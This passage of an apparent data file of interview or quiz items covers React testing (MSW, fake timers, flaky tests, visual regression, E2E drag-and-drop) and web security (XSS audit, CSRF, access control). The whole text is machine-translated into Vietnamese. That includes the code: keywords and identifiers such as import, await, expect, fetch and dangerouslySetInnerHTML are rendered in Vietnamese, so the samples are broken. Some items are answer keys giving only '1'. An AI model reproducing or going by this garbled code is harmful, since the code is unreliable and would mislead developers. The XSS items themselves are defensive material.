    explanation: 'Khi một yêu cầu có nguồn gốc chéo là "không đơn giản" (ví dụ: POST với Content-Type: application/json hoặc tiêu đề tùy chỉnh), trình duyệt sẽ gửi yêu cầu TÙY CHỌN trước để kiểm tra xem máy chủ có cho phép yêu cầu thực tế hay không.Máy chủ phải phản hồi bằng các tiêu đề `Access-Control-Allow-*` thích hợp.Điều này làm tăng thêm độ trễ cho mọi lệnh gọi API.Để tối ưu hóa: đặt `Access-Control-Max-Age: 86400` (24 giờ) trong phản hồi trước chuyến bay để trình duyệt lưu kết quả vào bộ nhớ đệm và bỏ qua yêu cầu TÙY CHỌN cho các cuộc gọi tiếp theo.Các tối ưu hóa khác: (1) Sử dụng các yêu cầu "đơn giản" nếu có thể (GET, POST với dữ liệu được mã hóa biểu mẫu) để tránh hoàn toàn việc chiếu trước.(2) Lệnh gọi API proxy thông qua cùng một nguồn gốc (ví dụ: các tuyến API Next.js) để loại bỏ hoàn toàn CORS.(3) Kết hợp nhiều lệnh gọi API thành một để giảm số lần kiểm tra trước.',
  },
  'atp-016': {
    question: 'Nhóm của bạn có phạm vi kiểm tra 0% trên một ứng dụng React lớn với hơn 200 thành phần.Bạn đã có 2 lần chạy nước rút để thiết lập chiến lược thử nghiệm.Bạn kiểm tra cái gì đầu tiên và bạn ưu tiên như thế nào?',
    answer: 'Ưu tiên theo rủi ro và ROI: (1) Kiểm tra tích hợp cho các luồng người dùng quan trọng (xác thực, kiểm tra, gửi dữ liệu), (2) Kiểm tra đơn vị cho các tiện ích dùng chung và logic nghiệp vụ, (3) Kiểm tra khói cho tất cả các tuyến.Bỏ qua các thử nghiệm có giá trị thấp như kiểm tra xem nút có hiển thị hay không.',
    explanation: 'Cúp thử nghiệm (Kent C. Dodds) ưu tiên thử nghiệm tích hợp hơn thử nghiệm đơn vị cho mã giao diện người dùng.Chiến lược: Sprint 1 — (1) Thiết lập cơ sở hạ tầng thử nghiệm: Vitest + Thư viện thử nghiệm React + MSW để mô phỏng API.Thêm vào quy trình CI để tất cả các PR trong tương lai đều yêu cầu phải vượt qua các bài kiểm tra.(2) Viết các bài kiểm tra tích hợp cho 5 luồng quan trọng nhất về doanh thu (đăng nhập, đăng ký, thanh toán, tìm kiếm, hoạt động CRUD cốt lõi).Chúng bắt được nhiều lỗi nhất cho mỗi bài kiểm tra được viết.(3) Thêm các thử nghiệm khói hiển thị từng tuyến đường và xác minh không có sự cố - chi phí viết rẻ, phát hiện lỗi nhập và thiếu nhà cung cấp.Sprint 2 — (4) Kiểm tra đơn vị tất cả các chức năng tiện ích thuần túy và mô-đun logic nghiệp vụ (trình định dạng ngày, trình tính giá, trình xác thực).Đây là nhanh, ổn định và ROI cao.(5) Thêm các bài kiểm tra hồi quy trực quan cho hệ thống thiết kế/các thành phần dùng chung bằng Chromatic hoặc Percy.(6) Thiết lập ngưỡng bao phủ (ví dụ: 60% cho mã mới) trong CI.KHÔNG nhắm đến phạm vi bao phủ 100% - tập trung vào hành vi thử nghiệm chứ không phải chi tiết triển khai.Tránh thử nghiệm các thành phần được tạo kiểu, trình bao bọc chuyển prop đơn giản hoặc hành vi của thư viện bên thứ ba.',
  },
  'atp-017': {
    question: 'Viết thử nghiệm tích hợp cho quy trình thanh toán gọi 3 API khác nhau: giỏ hàng, thanh toán và xác nhận đơn hàng.Sử dụng MSW để mô phỏng các API và kiểm tra cả lộ trình hài lòng cũng như lỗi thanh toán.',
    answer: 'nhập { render, screen, waitFor } từ \'@testing-library/react\';\nnhập userEvent từ \'@testing-library/user-event\';\nnhập { http, HttpResponse } từ \'msw\';\nnhập { setupServer } từ \'msw/node\';\nnhập { CheckoutPage } từ \'./CheckoutPage\';\n\nmáy chủ const = setupServer(\nhttp.get(\'/api/cart\', () =>\nHttpResponse.json({\nmặt hàng: [{ id: \'1\', tên: \'Widget\', giá: 29,99, qty: 2 }],\ntổng cộng: 59,98,\n})\n),\nhttp.post(\'/api/thanh toán\', () =>\nHttpResponse.json({giao dịchId: \'tx_123\', trạng thái: \'thành công\' })\n),\nhttp.post(\'/api/orders\', () =>\nHttpResponse.json({ orderId: \'ord_456\', trạng thái: \'đã xác nhận\' })\n)\n);\n\nbeforeAll(() => server.listen());\nafterEach(() => server.resetHandlers());\nafterAll(() => server.close());\n\ntest(\'đường dẫn hạnh phúc: người dùng hoàn tất thanh toán\', async () => {\nrender(<CheckoutPage />);\n\n// Đợi giỏ hàng tải\nmong đợi(đang chờ screen.findByText(\'Widget\')).toBeInTheDocument();\nmong đợi(screen.getByText(\'$59,98\')).toBeInTheDocument();\n\n// Điền thông tin thanh toán và gửi\nđang chờ userEvent.type(screen.getByLabelText(/số thẻ/i), \'4242424242424242\');\nđang chờ userEvent.click(screen.getByRole(\'button\', { name: /pay/i }));\n\n// Kiểm tra xác nhận đơn hàng\nmong đợi(đang chờ screen.findByText(/xác nhận đơn hàng/i)).toBeInTheDocument();\nmong đợi(screen.getByText(\'ord_456\')).toBeInTheDocument();\n});\n\ntest(\'thanh toán thất bại hiển thị lỗi và cho phép thử lại\', async () => {\n// Ghi đè điểm cuối thanh toán không thành công\nmáy chủ.use(\nhttp.post(\'/api/thanh toán\', () =>\nHttpResponse.json({ error: \'Thẻ bị từ chối\' }, { status: 402 })\n)\n);\n\nrender(<CheckoutPage />);\nđang chờ screen.findByText(\'Widget\');\n\nđang chờ userEvent.type(screen.getByLabelText(/số thẻ/i), \'0000000000000000\');\nđang chờ userEvent.click(screen.getByRole(\'button\', { name: /pay/i }));\n\nmong đợi(đang chờ screen.findByText(/card bị từ chối/i)).toBeInTheDocument();\n// Xác minh giỏ hàng vẫn hiển thị (không bị xóa)\nmong đợi(screen.getByText(\'Widget\')).toBeInTheDocument();\n// Xác minh nút thanh toán được bật lại để thử lại\nmong đợi(screen.getByRole(\'button\', { name: /pay/i })).toBeEnabled();\n});',
    explanation: 'Thử nghiệm này xác thực toàn bộ quy trình thanh toán từ góc nhìn của người dùng chứ không phải chi tiết triển khai.Các mẫu chính: (1) MSW (Mock Service Worker) chặn các yêu cầu mạng ở cấp độ nhân viên dịch vụ, do đó mã thành phần hoàn toàn không được sửa đổi - nó gọi tìm nạp/axios thực.(2) Trình xử lý mặc định trong `setupServer` xác định đường dẫn hạnh phúc.Ghi đè mỗi lần kiểm tra thông qua `server.use()` mô phỏng các lỗi mà không ảnh hưởng đến các kiểm tra khác.(3) `resetHandlers()` trong `afterEach` khôi phục các giá trị mặc định.(4) Các thử nghiệm tương tác thông qua các sự kiện của người dùng và khẳng định trên văn bản hiển thị, tuân theo nguyên tắc hướng dẫn của Thư viện thử nghiệm: "kiểm tra cách người dùng sử dụng phần mềm của bạn".(5) Kiểm tra lỗi sẽ xác minh lỗi hiển thị, bảo toàn dữ liệu (giỏ hàng chưa bị xóa) và khả năng phục hồi (bật thử lại).Điều này có giá trị hơn nhiều so với việc kiểm tra đơn vị từng lệnh gọi API một cách riêng biệt.',
  },
  'atp-018': {
    question: 'Kiểm tra không ổn định thất bại ngẫu nhiên trong CI nhưng đạt kết quả cục bộ.Nhóm của bạn mất niềm tin vào bộ thử nghiệm và bắt đầu bỏ qua các lỗi.Làm thế nào để bạn chẩn đoán và khắc phục các bài kiểm tra không ổn định một cách có hệ thống?',
    answer: 'Kiểm dịch các thử nghiệm không ổn định, sau đó chẩn đoán nguyên nhân gốc rễ: vấn đề về thời gian (thiếu WaitFor), trạng thái có thể thay đổi được chia sẻ, dữ liệu không xác định, hạn chế tài nguyên CI.Triển khai tính năng phát hiện thử nghiệm không ổn định trong CI và theo dõi các chỉ số về độ không ổn định.',
    explanation: 'Cách tiếp cận có hệ thống: (1) Phát hiện - định cấu hình CI để chạy lại các thử nghiệm không thành công (ví dụ: Vitest `--retry=2`, Jest `--bail=false` bằng plugin chạy lại).Một thử nghiệm vượt qua thử lại là không ổn định.Theo dõi và báo cáo những điều này.(2) Kiểm dịch - di chuyển các thử nghiệm không ổn định đã được xác nhận sang một bộ riêng biệt chạy nhưng không chặn việc hợp nhất.Điều này khôi phục niềm tin vào bộ chính ngay lập tức.(3) Các nguyên nhân gốc phổ biến: (a) Thời gian - kiểm tra xác nhận trước khi hoạt động không đồng bộ hoàn tất.Khắc phục: sử dụng truy vấn `waitFor`, `findBy*`, không bao giờ sử dụng `setTimeout` trong các thử nghiệm.(b) Trạng thái chia sẻ - kiểm tra A ghi vào cửa hàng/DB toàn cầu mà kiểm tra B đọc.Khắc phục: đặt lại tất cả trạng thái trong `BeforeEach`, sử dụng cách ly kiểm tra.(c) Sự phụ thuộc vào thứ tự - các bài kiểm tra đạt theo thứ tự này nhưng lại thất bại theo thứ tự khác.Khắc phục: chạy thử nghiệm theo thứ tự ngẫu nhiên (`--randomize`) để hiển thị các thử nghiệm này.(d) Hạn chế về tài nguyên CI - máy CI chậm hơn gây ra thời gian chờ.Khắc phục: tăng thời gian chờ cho các bài kiểm tra tích hợp, giảm tính song song của bài kiểm tra nếu bị ràng buộc bởi CPU.(e) Sự phụ thuộc ngày/giờ — các thử nghiệm sử dụng `Date.now()` thất bại vào lúc nửa đêm.Cách khắc phục: giả đồng hồ.(4) Phòng ngừa - thêm bước CI để phát hiện các thử nghiệm không ổn định mới bằng cách chạy bộ thử nghiệm 3x.Nếu bài kiểm tra đôi khi thành công và đôi khi thất bại, hãy chặn PR.',
  },
  'atp-019': {
    question: 'Làm cách nào để bạn kiểm tra một thành phần sử dụng `setTimeout` và `setInterval`?Viết chương trình kiểm thử cho thành phần đồng hồ đếm ngược tích tắc từng giây và gọi `onComplete` khi nó về 0.',
    answer: 'nhập { kết xuất, màn hình, hành động } từ \'@testing-library/react\';\nnhập { CountdownTimer } từ \'./CountdownTimer\';\n\nbeforeEach(() => { vi.useFakeTimers(); });\nafterEach(() => { vi.useRealTimers(); });\n\ntest(\'đếm ngược và gọi onComplete ở mức 0\', () => {\nconst onComplete = vi.fn();\nrender(<CountdownTimer giây={3} onComplete={onComplete} />);\n\nmong đợi(screen.getByText(\'3\')).toBeInTheDocument();\n\nAct(() => { vi.advanceTimersByTime(1000); });\nmong đợi(screen.getByText(\'2\')).toBeInTheDocument();\n\nAct(() => { vi.advanceTimersByTime(1000); });\nmong đợi(screen.getByText(\'1\')).toBeInTheDocument();\n\nAct(() => { vi.advanceTimersByTime(1000); });\nmong đợi(screen.getByText(\'0\')).toBeInTheDocument();\nmong đợi(onComplete).toHaveBeenCalledTimes(1);\n});\n\ntest(\'dọn dẹp khoảng thời gian ngắt kết nối\', () => {\nconst clearSpy = vi.spyOn(global, \'clearInterval\');\nconst { unmount } = render(<CountdownTimer giây={10} onComplete={vi.fn()} />);\n\nngắt kết nối();\nmong đợi(clearSpy).toHaveBeenCalled();\nClearSpy.mockRestore();\n});',
    explanation: 'Việc kiểm tra các thành phần dựa trên bộ đếm thời gian yêu cầu bộ tính giờ giả để tránh việc kiểm tra chậm, không ổn định.Các khái niệm chính: (1) `vi.useFakeTimers()` (Vitest) hoặc `jest.useFakeTimers()` thay thế `setTimeout`/`setInterval`/`Date` bằng hàng giả có thể kiểm soát được.(2) `vi.advanceTimersByTime(1000)` tua nhanh 1 giây ngay lập tức.(3) `act()` được yêu cầu trong các tiến bộ của bộ đếm thời gian vì chúng kích hoạt cập nhật trạng thái - nếu không có nó, React sẽ cảnh báo về các cập nhật trạng thái bên ngoài hành động.(4) Luôn khôi phục bộ hẹn giờ thực trong `afterEach` để tránh rò rỉ bộ hẹn giờ giả vào các thử nghiệm khác.(5) Kiểm tra ngắt kết nối xác minh thành phần xóa khoảng thời gian dọn dẹp, ngăn ngừa rò rỉ bộ nhớ và cảnh báo "setState trên thành phần chưa được gắn kết".Mẫu này áp dụng cho bất kỳ thành phần nào có hành vi dựa trên thời gian: gỡ lỗi, hoạt ảnh, bỏ phiếu, hẹn giờ đăng xuất tự động, v.v.',
  },
  'atp-020': {
    question: 'Bạn sẽ triển khai thử nghiệm hồi quy trực quan cho một thư viện thành phần có hơn 100 thành phần như thế nào?Mô tả công cụ, quy trình làm việc và cách xử lý các thay đổi trực quan có chủ ý.',
    answer: 'Sử dụng Storybook + Chromatic (hoặc ảnh chụp màn hình Percy/Nhà viết kịch).Mỗi PR tự động chụp ảnh màn hình của tất cả các câu chuyện thành phần và những điểm khác biệt so với đường cơ sở.Những thay đổi có chủ ý được phê duyệt trong giao diện người dùng đánh giá, cập nhật đường cơ sở.',
    explanation: 'Thiết lập: (1) Sách truyện - mỗi thành phần có các câu chuyện bao gồm các trạng thái hình ảnh của nó (mặc định, di chuột, lỗi, tải, chế độ tối, điểm dừng phản hồi).Chúng phục vụ như cả mục tiêu tài liệu và ảnh chụp màn hình.(2) Chromatic hoặc Percy - CI chụp ảnh màn hình của mọi câu chuyện trên mỗi PR.Công cụ này phân biệt chúng theo từng pixel với đường cơ sở được phê duyệt gần đây nhất và gắn cờ các thay đổi trực quan.(3) Quy trình làm việc - trên PR, các khác biệt trực quan xuất hiện dưới dạng kiểm tra trạng thái.Nhà thiết kế hoặc chủ sở hữu thành phần xem xét những điểm khác biệt trong Giao diện người dùng màu sắc.Nếu thay đổi là có chủ ý (ví dụ: cập nhật kiểu nút), họ sẽ phê duyệt thay đổi đó và cập nhật đường cơ sở.Nếu đó là hồi quy (ví dụ: thay đổi CSS đã phá vỡ thành phần khác), PR sẽ bị chặn.(4) Xử lý nội dung động - ngày mô phỏng, dữ liệu ngẫu nhiên và hoạt ảnh (tắt hoạt ảnh ở chế độ thử nghiệm hoặc sử dụng khung hoạt ảnh nhất quán).(5) Hiệu suất - Chromatic chỉ hiển thị lại các câu chuyện có tệp cơ bản đã thay đổi (thông qua theo dõi phụ thuộc), do đó, nó không chụp màn hình tất cả 500 câu chuyện trên mỗi PR.(6) Đa trình duyệt - chụp ảnh màn hình trong Chrome, Firefox và Safari để nắm bắt sự khác biệt khi hiển thị.Chi phí: Cấp miễn phí màu sắc bao gồm 5000 ảnh chụp nhanh/tháng, đủ cho hầu hết các nhóm.',
  },
  'atp-021': {
    question: 'API mô phỏng và API thực trong thử nghiệm - khi nào bạn nên sử dụng từng API?Thiết kế một chiến lược thử nghiệm sử dụng cả hai một cách thích hợp.',
    answer: 'Kiểm tra đơn vị/tích hợp: luôn mô phỏng (MSW).Kiểm tra E2E: sử dụng API thực dựa trên môi trường thử nghiệm/thử nghiệm.Kiểm tra hợp đồng: xác thực các mô hình phù hợp với lược đồ API thực.',
    explanation: 'Chiến lược thử nghiệm kim tự tháp: (1) Thử nghiệm đơn vị (thành phần/hook) - mô phỏng mọi thứ bên ngoài.Sử dụng MSW để chặn các yêu cầu HTTP.Điều này cho phép kiểm tra nhanh chóng, xác định.Bạn kiểm soát phản hồi: kiểm tra trạng thái tải, lỗi, trường hợp biên, dữ liệu trống.(2) Kiểm tra tích hợp (tính năng/trang) - cũng mô phỏng API thông qua MSW nhưng kiểm tra nhiều thành phần hoạt động cùng nhau.Điều quan trọng là phản hồi mô phỏng của bạn phải khớp với hình dạng API thực.(3) Kiểm tra hợp đồng - đây là cây cầu.Sử dụng các công cụ như Pact hoặc đơn giản là các lược đồ Zod được chia sẻ giữa quá trình thiết lập mô hình và xác thực API.Chạy công việc CI để tìm nạp các phản hồi API thực và xác thực chúng dựa trên các lược đồ mà mô hình của bạn sử dụng.Nếu API thay đổi, các thử nghiệm hợp đồng sẽ bị hỏng trước khi các bản mô phỏng của bạn âm thầm phân kỳ.(4) Thử nghiệm E2E (Cypress/Playwright) - đạt được API dàn dựng thực sự.Chúng kiểm tra toàn bộ ngăn xếp: mạng thực, xác thực thực, cơ sở dữ liệu thực.Nhưng chúng chậm và không ổn định, vì vậy hãy giới hạn ở các đường dẫn quan trọng hạnh phúc (5-10 luồng).(5) Không bao giờ sử dụng API thực trong các thử nghiệm đơn vị - chúng chậm, không xác định, yêu cầu mạng và bạn không thể dễ dàng kiểm tra các tình huống lỗi.Không bao giờ sử dụng mô hình trong các thử nghiệm E2E - điều đó làm mất đi mục đích xác thực từ đầu đến cuối.',
  },
  'atp-022': {
    question: 'Viết kiểm thử cho hook tùy chỉnh `useLocalStorage` đồng bộ hóa trạng thái với localStorage và cũng tìm nạp dữ liệu ban đầu từ API nếu localStorage trống.',
    answer: 'nhập { renderHook, act, waitFor } từ \'@testing-library/react\';\nnhập { http, HttpResponse } từ \'msw\';\nnhập { setupServer } từ \'msw/node\';\nnhập { useLocalStorage } từ \'./useLocalStorage\';\n\nmáy chủ const = setupServer(\nhttp.get(\'/api/preferences\', () =>\nHttpResponse.json({ theme: \'dark\', lang: \'en\' })\n)\n);\n\nbeforeAll(() => server.listen());\nafterEach(() => {\nserver.resetHandlers();\nlocalStorage.clear();\n});\nafterAll(() => server.close());\n\ntest(\'trả về dữ liệu từ localStorage nếu có\', () => {\nlocalStorage.setItem(\'prefs\', JSON.stringify({ theme: \'light\' }));\n\nconst { kết quả } = renderHook(() =>\nuseLocalStorage(\'prefs\', \'/api/preferences\')\n);\n\nmong đợi(result.current[0]).toEqual({ theme: \'light\' });\n});\n\ntest(\'tìm nạp từ API khi localStorage trống\', async () => {\nconst { kết quả } = renderHook(() =>\nuseLocalStorage(\'prefs\', \'/api/preferences\')\n);\n\nđang chờ waitFor(() => {\nmong đợi(result.current[0]).toEqual({ theme: \'dark\', lang: \'en\' });\n});\n\n// Xác minh nó đã được lưu vào localStorage\nmong đợi(JSON.parse(localStorage.getItem(\'prefs\')!)).toEqual({\nchủ đề: \'đen tối\',\nlang: \'en\',\n});\n});\n\ntest(\'setValue cập nhật trạng thái và localStorage\', async () => {\nlocalStorage.setItem(\'prefs\', JSON.stringify({ theme: \'light\' }));\n\nconst { kết quả } = renderHook(() =>\nuseLocalStorage(\'prefs\', \'/api/preferences\')\n);\n\nhành động (() => {\nresult.current[1]({ theme: \'blue\' });\n});\n\nmong đợi(result.current[0]).toEqual({ theme: \'blue\' });\nmong đợi(JSON.parse(localStorage.getItem(\'prefs\')!)).toEqual({ theme: \'blue\' });\n});\n\ntest(\'xử lý lỗi API một cách khéo léo\', async () => {\nmáy chủ.use(\nhttp.get(\'/api/preferences\', () => HttpResponse.error())\n);\n\nconst { kết quả } = renderHook(() =>\nuseLocalStorage(\'prefs\', \'/api/preferences\')\n);\n\n// Nên giữ nguyên null/không xác định, không bị lỗi\nđang chờ waitFor(() => {\nmong đợi(result.current[0]).toBeNull();\n});\n});',
    explanation: 'Việc kiểm tra các móc tùy chỉnh kết hợp các lệnh gọi API và localStorage yêu cầu: (1) `renderHook` từ Thư viện kiểm tra - hiển thị móc một cách riêng biệt mà không có trình bao bọc thành phần.(2) MSW để mô phỏng API - lệnh gọi hook tìm nạp nội bộ và MSW chặn nó một cách minh bạch.(3) `localStorage.clear()` trong `afterEach` — quan trọng đối với việc cách ly kiểm thử.Môi trường jsdom cung cấp triển khai localStorage đang hoạt động.(4) `waitFor` cho các hoạt động không đồng bộ - tìm nạp API không đồng bộ, vì vậy chúng tôi đợi trạng thái cập nhật.(5) Kiểm tra đường dẫn lỗi để đảm bảo hook không gặp sự cố khi API ngừng hoạt động và localStorage trống.(6) `act()` bao bọc các bản cập nhật trạng thái đồng bộ (setValue).Các thử nghiệm xác minh chuỗi hành vi đầy đủ: đọc → tìm nạp dự phòng → duy trì → cập nhật → duy trì, bao gồm tất cả các đường dẫn mã.',
  },
  'atp-023': {
    question: 'Bạn sẽ viết bài kiểm tra E2E cho bảng Kanban kéo và thả (như Trello) như thế nào?Thẻ có thể được kéo giữa các cột và thứ tự được lưu giữ trên máy chủ.',
    answer: 'Sử dụng Playwright với API kéo và thả tích hợp sẵn.Kiểm tra chuyển động của thẻ giữa các cột, tính bền vững của thứ tự và hoàn tác.Giả lập API hoặc sử dụng cơ sở dữ liệu thử nghiệm.Xác nhận theo thứ tự DOM, không phải tọa độ.',
    explanation: 'Việc kéo và thả thử nghiệm E2E nổi tiếng là khó vì nó liên quan đến các sự kiện con trỏ, đột biến DOM và các thư viện có thể phức tạp như dnd-kit hoặc Reac-beautiful-dnd.Chiến lược với Nhà viết kịch: (1) Sử dụng `page.locator(cardSelector).dragTo(page.locator(targetColumn))` — Nhà viết kịch mô phỏng toàn bộ chuỗi kéo (con trỏ xuống, con trỏ di chuyển, con trỏ lên).(2) Để định vị chính xác trong một cột (ví dụ: thả giữa thẻ 2 và thẻ 3), hãy sử dụng `dragTo` với offset `targetPosition: { x, y }`.(3) Các xác nhận - xác nhận theo thứ tự DOM, không phải vị trí pixel: `const cards = chờ cột.locator(\'.card\').allTextContents();mong đợi(cards).toEqual([\'Nhiệm vụ A\', \'Nhiệm vụ C\', \'Nhiệm vụ B\']);`.(4) Kiên trì - sau khi kéo, hãy tải lại trang và xác minh thứ tự vẫn tồn tại.Điều này kiểm tra toàn bộ chuyến đi khứ hồi: kéo → lệnh gọi API → máy chủ → tải lại trang → cùng một thứ tự.(5) Các trường hợp cạnh cần kiểm tra: kéo đến cột trống, kéo thẻ cuối cùng ra khỏi cột, kéo nhanh liên tiếp, kéo trong khi người dùng khác sửa đổi bảng (nếu hợp tác).(6) Sử dụng thuộc tính `data-testid` trên thẻ và cột thay vì bộ chọn CSS để đảm bảo tính ổn định.(7) Để có tốc độ CI, hãy sử dụng cơ sở dữ liệu thử nghiệm thực nhưng tách biệt với dữ liệu gốc chứ không phải mô phỏng - các thử nghiệm E2E sẽ xác thực toàn bộ ngăn xếp.',
  },
  'atp-024': {
    question: 'Thư viện thử nghiệm React khuyến khích phương pháp thử nghiệm nào?',
    answer: '1',
    explanation: 'Nguyên tắc hướng dẫn của Thư viện thử nghiệm phản ứng là: "Các thử nghiệm của bạn càng giống với cách sử dụng phần mềm của bạn thì chúng càng mang lại cho bạn sự tự tin."Điều này có nghĩa là truy vấn theo vai trò (`getByRole`), nhãn (`getByLabelText`) và văn bản (`getByText`) — giống như cách người dùng hoặc công nghệ hỗ trợ tìm thấy các phần tử.Nó cố tình KHÔNG để lộ các phần bên trong như móc trạng thái hoặc vòng đời.Kết xuất nông (tùy chọn D) và thử nghiệm ảnh chụp nhanh (tùy chọn C) không được khuyến khích: kiểm tra kết xuất nông chi tiết triển khai và các điểm dừng trên các bộ tái cấu trúc không thay đổi hành vi;các thử nghiệm chụp nhanh có tín hiệu thấp (nhà phát triển cập nhật ảnh chụp nhanh một cách mù quáng) và có độ nhiễu cao (bất kỳ thay đổi đánh dấu nào cũng gây ra sự khác biệt).Mức độ ưu tiên truy vấn ưu tiên là: `getByRole` > `getByLabelText` > `getByPlaceholderText` > `getByText` > `getByTestId`.`getByTestId` là lối thoát khi không có truy vấn ngữ nghĩa nào hoạt động.',
  },
  'atp-025': {
    question: 'Thử nghiệm này đạt cục bộ nhưng hết thời gian trong CI.Thành phần tìm nạp dữ liệu trên mount.Có chuyện gì vậy?',
    answer: 'Thử nghiệm không mô phỏng lệnh gọi API.Tại địa phương, nó có thể tấn công một máy chủ dev đang chạy, nhưng trong CI không có máy chủ.Cuộc gọi tìm nạp không thành công hoặc bị treo và "John Doe" không bao giờ xuất hiện.Khắc phục: sử dụng MSW để mô phỏng điểm cuối.',
    explanation: 'Đây là một lỗi phổ biến khi chuyển từ kiểm thử thủ công sang kiểm thử tự động.Thành phần này gọi nội bộ `fetch("/api/users/123")`.Tại địa phương, nếu máy chủ nhà phát triển đang chạy trên cùng một cổng thì yêu cầu sẽ thành công một cách tình cờ.Trong CI, không có máy chủ, do đó quá trình tìm nạp: (1) treo vô thời hạn (không định cấu hình thời gian chờ), khiến `findByText` hết thời gian chờ sau 1000 mili giây hoặc (2) không thành công do lỗi mạng và thành phần hiển thị trạng thái lỗi thay vì "John Doe".Khắc phục: sử dụng MSW để mô phỏng API ở cấp độ thử nghiệm: `server.use(http.get(\'/api/users/123\', () => HttpResponse.json({ name: \'John Doe\' })))`.Điều này làm cho bài kiểm tra mang tính quyết định — nó không phụ thuộc vào các dịch vụ bên ngoài.Nguyên tắc chung: nếu thử nghiệm của bạn hoạt động cục bộ nhưng không phải trong CI, thì thử nghiệm đó có sự phụ thuộc ngầm vào thứ gì đó trong môi trường cục bộ của bạn (máy chủ đang chạy, cơ sở dữ liệu hạt giống, biến môi trường, tệp trên đĩa).',
  },
  'atp-026': {
    question: 'MSW (Mock Service Worker) có gì khác với việc chế nhạo trực tiếp `tìm nạp` hoặc `axios`?',
    answer: '1',
    explanation: 'MSW chặn các yêu cầu ở cấp độ mạng bằng cách sử dụng Service Worker (trong trình duyệt) hoặc bằng cách vá các mô-đun yêu cầu Node.js (trong các thử nghiệm).Mã ứng dụng của bạn gọi `tìm nạp` hoặc `axios` thực - nó không biết rằng các yêu cầu đang bị chặn.Điều này về cơ bản khác với `jest.mock("axios")` thay thế hoàn toàn mô-đun: mô-đun giả lập bỏ qua quá trình tuần tự hóa, tiêu đề và chuyển đổi yêu cầu/phản hồi, do đó, các trình chặn và mã xử lý lỗi của bạn không bao giờ chạy.Với MSW, toàn bộ đường dẫn yêu cầu sẽ thực thi (tuần tự hóa, tiêu đề, bộ chặn, phân tích cú pháp phản hồi), mang lại độ tin cậy cao hơn nhiều.Điều đó cũng có nghĩa là thiết lập mô phỏng tương tự sẽ hoạt động trong Storybook (trình duyệt), thử nghiệm (Node) và phát triển (trình duyệt), giảm trùng lặp.',
  },
  'atp-027': {
    question: 'Kiểm tra bảo mật đã tìm thấy lỗ hổng XSS trong ứng dụng React của bạn.Làm thế nào để bạn tìm và sửa chữa tất cả các trường hợp một cách có hệ thống?Thiết kế một chiến lược phòng ngừa.',
    answer: 'Kiểm tra tất cả các hoạt động sử dụng DangerouslySetInnerHTML, cấu trúc URL bằng thông tin đầu vào của người dùng và kết xuất HTML của bên thứ ba.Triển khai các tiêu đề CSP, khử trùng bằng DOMPurify và thêm các quy tắc ESLint để ngăn chặn các sự cố xảy ra trong tương lai.',
    explanation: 'Các bước khắc phục: (1) Kiểm tra ngay lập tức — tìm kiếm cơ sở mã cho: `nguy hiểmSetInnerHTML`, `innerHTML`, `document.write`, `eval`, `new Function`, `javascript:` URL, `href={userInput}` mà không cần xác thực.React tự động thoát khỏi các biểu thức JSX, nhưng chúng bỏ qua nó.(2) Khắc phục từng trường hợp: thay thế `nguy hiểmSetInnerHTML` bằng trình khử trùng như DOMPurify (`<div nguy hiểmSetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />`).Đối với các URL do người dùng cung cấp, hãy xác thực dựa trên danh sách giao thức được phép (`https:`, `mailto:`).Đối với văn bản có định dạng, hãy sử dụng trình kết xuất an toàn chỉ cho phép các thẻ HTML cụ thể.(3) Chính sách bảo mật nội dung - thêm tiêu đề CSP: `script-src \'self\';style-src \'self\' \'không an toàn nội tuyến\';đối tượng-src \'không\'`.Đây là cách phòng thủ mạnh nhất vì ngay cả khi XSS vượt qua quá trình dọn dẹp, trình duyệt sẽ chặn việc thực thi tập lệnh nội tuyến.(4) Phòng ngừa - thêm các quy tắc ESLint: `phản ứng/không nguy hiểm`, một quy tắc tùy chỉnh cấm `innerHTML`.Thêm CSP `loại đáng tin cậy` để bảo vệ việc tiêm DOM.(5) Rủi ro của bên thứ ba - kiểm tra các gói npm để phát hiện các vấn đề XSS đã biết thông qua `npm Audit`.Các thư viện hiển thị HTML (trình kết xuất đánh dấu, trình soạn thảo WYSIWYG) là các vectơ phổ biến.(6) Kiểm tra - thêm các bài kiểm tra tải trọng XSS tự động vào bộ kiểm tra bảo mật của bạn.',
  },
  'atp-028': {
    question: 'Triển khai bảo vệ CSRF cho React SPA giao tiếp với API REST.API nằm trên một tên miền phụ khác.',
    answer: 'Sử dụng mẫu mã thông báo đồng bộ hóa: máy chủ đặt mã thông báo CSRF trong cookie, SPA đọc nó và gửi nó trong tiêu đề tùy chỉnh (X-CSRF-Token) với mọi yêu cầu thay đổi.Máy chủ xác nhận cả hai trận đấu.',
    explanation: 'Các cuộc tấn công CSRF lừa trình duyệt của người dùng thực hiện các yêu cầu không mong muốn tới API của bạn bằng cách sử dụng cookie của người dùng.Chiến lược bảo vệ: (1) Mẫu cookie gửi hai lần - khi đăng nhập, máy chủ đặt hai thứ: cookie phiên (HttpOnly, Secure, SameSite=Lax) và cookie mã thông báo CSRF (KHÔNG phải HttpOnly, vì vậy JS có thể đọc nó).(2) SPA đọc cookie CSRF thông qua `document.cookie` hoặc một điểm cuối chuyên dụng và bao gồm nó dưới dạng tiêu đề tùy chỉnh `X-CSRF-Token` trên mỗi yêu cầu POST/PUT/PATCH/DELETE.(3) Máy chủ xác thực rằng tiêu đề `X-CSRF-Token` khớp với cookie CSRF.Việc gửi biểu mẫu có nguồn gốc chéo của kẻ tấn công không thể đặt tiêu đề tùy chỉnh (CORS chặn nó), do đó cuộc tấn công không thành công.(4) Đối với tên miền phụ chéo (`app.example.com` → `api.example.com`): đặt cookie CSRF bằng `Domain=.example.com` để SPA có thể đọc nó.Định cấu hình CORS trên API để cho phép nguồn gốc SPA và tiêu đề `X-CSRF-Token`.(5) `SameSite=Lax` trên cookie phiên sẽ tự động chặn hầu hết CSRF (không có cookie nào được gửi trên POST nhiều nguồn gốc), nhưng vẫn nên bảo vệ chuyên sâu bằng mã thông báo.(6) Triển khai khung: Trình chặn chặn Axios đọc cookie và đặt tiêu đề cho mọi yêu cầu.',
  },
  'atp-029': {
    question: 'Kỹ sư QA báo cáo rằng họ có thể truy cập các trang quản trị bằng cách thay đổi URL từ /dashboard thành /admin.Tuyến đường hiển thị nhưng nên bị hạn chế.Khắc phục sự cố bảo mật.',
